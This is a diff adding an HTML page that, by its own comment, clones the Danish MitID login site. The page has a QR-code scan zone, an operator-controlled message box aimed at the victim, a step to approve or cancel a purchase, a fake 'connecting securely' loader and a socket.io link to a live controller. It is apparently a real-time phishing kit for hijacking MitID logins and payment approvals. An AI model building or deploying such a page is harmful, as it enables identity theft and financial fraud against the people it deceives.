@@ -1,0 +1,322 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Log on – MitID</title>
+<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap">
+<style>
+/* ════════════════════════════════════════════════════════════
+   1:1 kopi af login.mitid.dk (ud fra kundens egen login.html-kopi)
+   + QR-zone, besked/action-trin
+   ════════════════════════════════════════════════════════════ */
+*, *::after, *::before { box-sizing: border-box; }
+html, body { margin: 0; height: 100%; width: 100%; }
+body {
+  background-color: #fff;
+  font-family: "IBM Plex Sans", "IBMPlexSans", system-ui, sans-serif;
+  font-size: 16px;
+  font-weight: normal;
+  color: #1a1a1a;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: #0060E6; }
+p { line-height: 24px; }
+.hidden { display: none !important; }
+
+/* HEADER */
+.header-container { display: flex; flex-direction: column; align-items: center; border: none; background-color: #F5F5F5; }
+.header-content { display: flex; flex-direction: column; flex-grow: 1; max-width: 912px; min-height: 156px; width: 100%; justify-content: flex-end; align-items: stretch; }
+.header-row { display: flex; flex-direction: row; flex-grow: 0; width: 100%; }
+.header-links { display: flex; flex-direction: row; flex-grow: 0; justify-content: flex-start; padding-top: 24px; padding-bottom: 10px; min-height: 30px; align-items: center; }
+.link-burger { display: flex; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; color: #191919; font-size: 14px; font-family: inherit; padding: 4px 0; }
+.link-spacer { display: flex; flex: 1; }
+.link-language { display: flex; flex: 0; background-color: #fff; border: 1px solid #BFBFBF; border-radius: 4px; cursor: pointer; color: #0060E6; font-size: 12px; font-weight: bold; padding: 6px 16px; margin-left: 8px; font-family: inherit; text-decoration: none; }
+.link-language:hover { color: #000; }
+.link-language:focus { outline: 4px solid #747474; outline-offset: 1px; }
+.header-logo { display: flex; flex-direction: column; flex-grow: 1; align-self: center; justify-content: center; align-items: start; }
+.header-logo > img { margin-top: -48px; margin-left: -200px; height: 60px; width: auto; }
+.header-nav { display: flex; flex-direction: row; flex-grow: 0; justify-content: flex-start; white-space: nowrap; overflow: hidden; }
+.header-nav-link { display: flex; flex-direction: row; height: 48px; font-weight: normal; color: #000; text-decoration: none; }
+.header-nav-link.selected { display: flex; flex-direction: row; font-weight: 500; }
+.btn-lead-spacer { flex: 1; }
+.btn-slice2 { display: flex; padding: 7px 32px; justify-content: center; align-items: center; font-size: 16px; font-weight: 500; border-top: 3px solid transparent; border-bottom: 3px solid transparent; }
+.header-nav-link.selected > .btn-slice2 { background-color: #fff; border-top: solid 3px #0060E6; }
+.header-nav-link:not(.selected):hover > .btn-slice2 { border-bottom: solid 3px #999; }
+
+/* PAGE */
+.page-container { display: flex; flex-direction: column; align-items: center; flex: 1; }
+.page-content { display: flex; flex-direction: row; flex-grow: 1; flex-shrink: 0; max-width: 912px; width: 100%; }
+.page-section { display: flex; flex: 1; flex-shrink: 0; flex-direction: column; }
+.main-section { padding: 64px 42px 16px 0; }
+
+/* LOGIN CARD */
+.login-card { background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 32px 24px; max-width: 544px; width: 100%; position: relative; min-height: 480px; }
+.login-card-header { display: flex; justify-content: space-between; align-items: center; margin: 0 0 16px; }
+.login-card-header h1 { display: inline; margin: 0; font-size: 20px; font-weight: 600; color: #000; }
+.login-card-header-right { display: flex; align-items: center; }
+.login-card-divider { border: 0; border-top: 1px solid rgba(0,0,0,.1); margin: 16px 0 16px; }
+
+/* FIELD */
+.field-label { display: flex; align-items: center; margin-bottom: 8px; }
+.field-label label { font-size: 14px; font-weight: 600; color: #1a1a1a; }
+.info-icon { width: 18px; height: 18px; cursor: pointer; color: #747474; margin-left: 8px; }
+
+/* QR-ZONE — præcis som den ægte MitID-QR-skærm */
+.qr-zone { text-align: center; padding: 10px 0 2px; }
+.qr-frame-mitid {
+  display: inline-block;
+  background: #fff;
+  border: 1px solid #ccc;
+  padding: 10px;
+  margin-bottom: 14px;
+}
+#qrcode { width: 176px; height: 176px; }
+#qrcode svg, #qrcode img, #qrcode canvas { display: block; width: 100% !important; height: 100% !important; }
+.qr-hint {
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  font-size: 16px; font-weight: 600; color: #1a1a1a;
+  padding: 0 0 10px;
+}
+.qr-hint svg { flex-shrink: 0; }
+.qr-status-line { font-size: 14px; color: #1a1a1a; min-height: 20px; margin-bottom: 6px; }
+.qr-offline { display: inline-block; max-width: 320px; margin: 10px 0 18px; padding: 20px 24px; background: #f2f2f2; border: 1px solid #d9d9d9; border-radius: 4px; text-align: center; }
+.qr-offline strong { display: block; font-size: 16px; font-weight: 600; color: #1a1a1a; margin-bottom: 6px; }
+.qr-offline span { font-size: 14px; color: #555; }
+
+/* TEKST-BOX — besked til kunden (admin-styret fritekst) */
+.tekst-box {
+  background: #fff;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  padding: 28px 24px;
+  margin: 8px 0 16px;
+  text-align: left;
+}
+.tekst-box:empty { display: none; }
+.tekst-head { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
+.tekst-head-icon {
+  width: 44px; height: 44px; flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  background: #F2F7FE; border-radius: 8px;
+}
+.tekst-head-title { font-size: 16px; font-weight: 600; color: #1a1a1a; }
+.tekst-body { font-size: 15px; color: #1a1a1a; line-height: 24px; white-space: pre-wrap; }
+
+/* BESKED-BOX (trin: ny sikker besked) */
+.besked-box { text-align: center; padding: 10px 0 6px; }
+.besked-icon { width: 72px; height: 72px; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; background: #ebf5ff; border-radius: 50%; }
+.besked-title { font-size: 17px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
+.besked-sub { font-size: 13px; color: #777; margin-bottom: 22px; }
+.besked-box .btn-continue { display: inline-flex; align-items: center; justify-content: space-between; width: 100%; max-width: 340px; min-height: 40px; padding: 8px 16px; border: 2px solid #0060E6; border-radius: 4px; background-color: #0060E6; color: #fff; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; }
+.besked-box .btn-continue:hover { background-color: #004993; border-color: #003972; }
+.besked-box .btn-continue svg { width: 24px; height: 24px; fill: #fff; }
+
+/* ACTION-BOX (godkend køb / annuller betaling) */
+.action-box { text-align: center; padding: 6px 0 4px; }
+.action-amount { font-size: 26px; font-weight: 600; color: #000; margin-bottom: 6px; font-variant-numeric: tabular-nums; }
+.action-amount:empty { display: none; }
+.action-title { font-size: 16px; font-weight: 500; color: #1a1a1a; margin-bottom: 8px; line-height: 1.4; }
+.action-detail { font-size: 13px; color: #777; margin-bottom: 10px; line-height: 1.5; max-width: 320px; margin-left: auto; margin-right: auto; }
+.action-divider { border: 0; border-top: 1px solid rgba(0,0,0,.1); margin: 14px 0 18px; }
+.action-buttons { display: flex; gap: 12px; justify-content: center; margin-bottom: 14px; }
+.action-btn { flex: 1; max-width: 170px; min-height: 44px; border: 2px solid #0060E6; border-radius: 4px; background: #fff; color: #0060E6; font-family: inherit; font-size: 14px; font-weight: 600; letter-spacing: .04em; cursor: pointer; transition: all .15s; }
+.action-ok { background: #0060E6; color: #fff; }
+.action-ok:hover:not(:disabled) { background: #004993; border-color: #003972; }
+.action-cancel { border-color: #888; color: #555; }
+.action-cancel:hover:not(:disabled) { background: #f2f2f2; }
+.action-btn:disabled { opacity: .55; cursor: default; }
+.action-security { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 12px; color: #777; }
+
+/* SECURITY INFO */
+.security-info { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #666; padding: 10px 12px; background: #f7f7f7; border: 1px solid #e3e3e3; border-radius: 4px; margin-bottom: 14px; }
+.security-info svg { flex-shrink: 0; color: #2e9e5b; }
+
+/* HELP LINKS */
+.help-links { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+.help-links a { color: #0060E6; font-size: 13px; font-weight: 600; text-decoration: none; }
+.help-links a:hover { text-decoration: underline; }
+.help-links .separator { color: #ccc; }
+
+/* CHECKBOX */
+.checkbox-wrap { display: flex; align-items: center; gap: 10px; margin: 18px 0; }
+.checkbox-wrap input[type=checkbox] { width: 18px; height: 18px; accent-color: #0060E6; cursor: pointer; }
+.checkbox-wrap label { font-size: 14px; color: #1a1a1a; cursor: pointer; }
+
+/* BOTTOM LINKS */
+.bottom-links { display: flex; align-items: center; gap: 40px; }
+.bottom-links span { font-size: 14px; font-weight: 600; color: #0059B3; cursor: pointer; }
+.bottom-links span:hover { text-decoration: underline; }
+
+/* SIDEBAR */
+.sidebar-wrapper { padding: 64px 0 0 32px; max-width: 320px; }
+.info-section { display: flex; flex-direction: column; padding: 0 0 24px; }
+.info-header { display: flex; align-items: center; flex: 1; border-top-left-radius: 5px; border-top-right-radius: 5px; height: 40px; width: max-content; padding: 12px 16px; background-color: #F2F7FE; font-size: 12px; font-weight: bold; }
+.info-content { display: inline-block; flex: 1; border: 1px solid #ccc; padding: 12px 16px; font-size: 14px; line-height: 24px; }
+.info-content p { margin: 0 0 8px; }
+.info-content p:last-child { margin: 0; }
+.info-content ul { list-style-type: none; padding-inline-start: 0; margin: 0; }
+.info-content li::before { content: '-'; margin-right: 4px; }
+.info-content a, .info-content a span { text-decoration: underline; }
+
+/* LOADER */
+.loader-container { background: #fff; position: absolute; left: 0; top: 0; width: 100%; height: 100%; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; }
+.loader-brand { margin-bottom: 32px; }
+.loader-brand-icon { width: 80px; height: 21px; }
+.loader-shield { position: relative; width: 110px; height: 128px; margin: 0 auto 28px; }
+.loader-shield-svg { width: 100%; height: 100%; animation: shieldPulse 1.6s ease-in-out infinite; }
+.loader-shield-ring { position: absolute; top: 0; left: 0; width: 100%; height: 100%; animation: shieldRing 1.8s linear infinite; }
+@keyframes shieldPulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: .4; transform: scale(1.06); } }
+@keyframes shieldRing { from { stroke-dashoffset: 320; } to { stroke-dashoffset: -320; } }
+.loader-text { font-size: 16px; font-weight: 600; color: #000; margin-bottom: 6px; text-align: center; }
+.loader-subtext { font-size: 14px; color: #666; text-align: center; min-height: 18px; }
+.loader-dots { display: flex; gap: 7px; margin-top: 20px; align-items: center; }
+.loader-dots span { width: 8px; height: 8px; border-radius: 50%; background: #0060e6; animation: dotBounce 1.2s ease-in-out infinite; }
+.loader-dots span:nth-child(2) { animation-delay: .15s; }
+.loader-dots span:nth-child(3) { animation-delay: .3s; }
+@keyframes dotBounce { 0%,80%,100% { transform: scale(.6); opacity: .4; } 40% { transform: scale(1); opacity: 1; } }
+
+/* RESPONSIVE */
+@media only screen and (max-width: 1320px) { .header-logo > img { margin-left: -141px; } }
+@media only screen and (max-width: 1185px) { .header-logo > img { margin-left: 0; } }
+@media only screen and (max-width: 879px) {
+  .header-content { min-height: 1px; }
+  .header-logo { display: none; }
+  .page-section.main-section { padding: 24px 16px; }
+  .info-section { display: none !important; }
+  .header-nav { flex-direction: column; }
+  .header-nav .header-nav-link { display: none; }
+  .header-nav .header-nav-link.selected { display: flex; flex-grow: 1; }
+  .header-nav .header-nav-link .btn-slice2 { border: none; background-color: #f5f5f5; flex-grow: 1; justify-content: flex-start; border-bottom: 3px solid #999; padding-left: 15px; }
+  .header-nav .header-nav-link.selected > .btn-slice2 { background-color: #fff; color: #191919; border-bottom: 3px solid #0060E6; }
+  .link-language { padding: 6px 8px; }
+}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://unpkg.com/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="header-container">
+  <div class="header-content">
+    <div class="header-row header-links">
+      <button type="button" class="link-burger" aria-label="Open menu">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="#191919"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+        Menu
+      </button>
+      <div class="link-spacer"></div>
+      <a href="#" class="link-language selected">Dansk</a>
+      <a href="#" class="link-language">Kalaallisut</a>
+    </div>
+    <div class="header-row header-logo">
+      <img src="assets/Log-in.svg" alt="Log-in" onerror="this.style.display='none'">
+    </div>
+    <nav class="header-row header-nav">
+      <div class="header-nav-link btn-lead-spacer"></div>
+      <div class="header-nav-link selected"><div class="btn-slice2">MitID</div></div>
+      <a href="#" class="header-nav-link"><div class="btn-slice2">International</div></a>
+    </nav>
+  </div>
+</header>
+
+<!-- MAIN -->
+<div class="page-container">
+  <div class="page-content">
+
+    <!-- LEFT: LOGIN CARD -->
+    <div class="page-section main-section">
+
+      <!-- LOGIN CARD -->
+      <div class="login-card" id="loginForm">
+        <div class="login-card-header">
+          <h1 id="formHeading">Log on</h1>
+          <div class="login-card-header-right">
+            <svg xmlns="http://www.w3.org/2000/svg" width="46" height="12" viewBox="0 0 61 16" aria-label="MitID logo">
+              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
+            </svg>
+          </div>
+        </div>
+        <hr class="login-card-divider">
+
+        <!-- Label: som den ægte MitID -->
+        <div class="field-label">
+          <label>Scan QR-kode med MitID app</label>
+          <svg class="info-icon" viewBox="0 0 18 18" fill="currentColor">
+            <path d="M9 1.5a7.5 7.5 0 100 15 7.5 7.5 0 000-15zM9.75 12.75h-1.5v-4.5h1.5v4.5zm0-6h-1.5v-1.5h1.5v1.5z"/>
+          </svg>
+        </div>
+
+        <!-- QR-ZONE: præcis som den ægte MitID-QR-skærm -->
+        <div class="qr-zone" id="qrZone">
+          <div class="qr-frame-mitid" id="qrFrame" style="display:none;">
+            <div id="qrcode"></div>
+          </div>
+
+          <div class="qr-hint" style="display:none;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="#0060e6" aria-hidden="true">
+              <path d="M3 2h6v2H5v16h4v2H3V2zm18 0v20h-6v-2h4V4h-2V2h4zM11 7h2v2h-2V7zm2 2h2v2h-2V9zm-2 2h2v2h-2v-2zm2 2h2v2h-2v-2z"/>
+            </svg>
+            <span id="hintText">Scan QR-kode med MitID app</span>
+          </div>
+          <div class="qr-status-line" id="qrStatusLine"></div>
+        </div>
+
+        <hr class="login-card-divider">
+
+        <div class="bottom-links">
+          <span onclick="history.back()">Afbryd</span>
+          <span>Hjælp</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: SIDEBAR -->
+    <div class="sidebar-wrapper">
+      <div class="info-section">
+        <div class="info-header">Operational status</div>
+        <div class="info-content">Normal operation</div>
+      </div>
+      <div class="info-section">
+        <div class="info-header">Safe use of MitID</div>
+        <div class="info-content">
+          <p>Take good care of your MitID and always keep your MitID details to yourself. Get good advice on the safe use of MitID.</p>
+          <p><a rel="noopener" href="https://www.nemlog-in.dk/login/sikkerhed" target="_blank">Sikkerhed</a></p>
+        </div>
+      </div>
+      <div class="info-section">
+        <div class="info-header">Processing of your personal data</div>
+        <div class="info-content">
+          <p>When you use NemLog-in to confirm your identity, your personal data is processed by the Danish Agency for Digital Government. Read more on the Agency&#39;s website.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LOADER (Forbinder sikkert til MitID) -->
+<div id="loaderContainer" class="loader-container hidden">
+  <div class="loader-brand">
+    <svg width="80" height="21" viewBox="0 0 61 16" class="loader-brand-icon">
+      <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
+    </svg>
+  </div>
+  <div class="loader-shield">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true" class="loader-shield-svg">
+      <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
+    </svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" class="loader-shield-ring">
+      <path d="M49.9,4l43,12.9v36.7c0,42.5-43,54.4-43,54.4s-43-11.9-43-54.4V16.9L49.9,4" fill="none" stroke="#0060e6" stroke-width="3" stroke-dasharray="320" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <div class="loader-text" id="loaderText">Forbinder sikkert til MitID</div>
+  <div class="loader-subtext" id="loaderStatus">Vent et øjeblik ...</div>
+  <div class="loader-dots"><span></span><span></span><span></span></div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="/display.js"></script>
+</body>
+</html>
